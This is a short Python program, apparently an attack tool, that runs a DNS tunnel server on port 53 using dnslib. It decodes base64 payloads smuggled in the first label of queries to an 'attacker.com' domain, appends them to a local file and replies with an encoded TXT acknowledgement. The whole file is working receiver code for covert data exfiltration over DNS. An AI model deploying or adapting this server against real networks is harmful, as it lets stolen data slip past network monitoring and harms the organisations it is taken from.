import base64
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, TXT


class TunnelResolver(BaseResolver):

    def resolve(self, request, handler):
        reply = request.reply()

        qname = request.q.qname
        labels = str(qname).rstrip(".").split(".")

        # Expect: <payload>.attacker.com
        try:
            payload = labels[0]
            decoded = base64.urlsafe_b64decode(payload + "==").decode()
            print("Received:", decoded)

            with open("data.txt", "a") as f: 
                f.write(decoded)

            response_text = "ack"
            encoded_resp = base64.urlsafe_b64encode(
                response_text.encode()
            ).decode()


            reply.add_answer(
                RR(
                    qname,
                    QTYPE.TXT,
                    rdata=TXT(encoded_resp),
                    ttl=0
                )
            )
        except Exception as e:
            print("Error:", e)

        return reply



if __name__ == "__main__":
    server = DNSServer(
        TunnelResolver(),
        port=53,
        address="0.0.0.0",
        tcp=False
    )
    print("DNS tunnel server running")
    server.start_thread()

    input("Press enter to stop\n")

